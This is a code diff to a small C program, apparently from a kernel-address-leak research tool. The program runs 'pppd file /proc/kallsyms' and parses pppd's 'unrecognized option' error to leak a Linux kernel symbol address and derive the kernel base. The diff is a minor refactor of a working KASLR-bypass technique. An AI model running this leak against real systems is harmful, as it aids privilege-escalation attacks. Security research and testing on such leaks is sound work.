@@ -11,19 +11,17 @@
 // ---
 // <bcoles@gmail.com>
 
-#define _GNU_SOURCE
+#define _DEFAULT_SOURCE
+#include "kasld.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include "kasld.h"
 
 unsigned long get_kernel_addr_pppd_kallsyms() {
   FILE *f;
   char *addr_buf;
   char *endptr;
-  char *substr;
   const char *cmd = "pppd file /proc/kallsyms 2>&1";
-  const char *needle = "unrecognized option";
   unsigned long addr = 0;
   char buf[1024];
 
@@ -44,11 +42,10 @@ unsigned long get_kernel_addr_pppd_kallsyms() {
   pclose(f);
 
   /* pppd: In file /proc/kallsyms: unrecognized option 'c1000000' */
-  substr = (char *)memmem(buf, sizeof(buf), needle, strlen(needle));
-  if (substr == NULL)
+  if (strstr(buf, "unrecognized option") == NULL)
     return 0;
 
-  addr_buf = strstr(substr, "'");
+  addr_buf = strstr(buf, "'");
   if (addr_buf == NULL)
     return 0;
 
@@ -66,7 +63,7 @@ int main(int argc, char **argv) {
     return 1;
 
   printf("leaked kernel symbol: %lx\n", addr);
-  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
+  printf("possible kernel base: %lx\n", addr & ~KERNEL_BASE_MASK);
 
   return 0;
 }
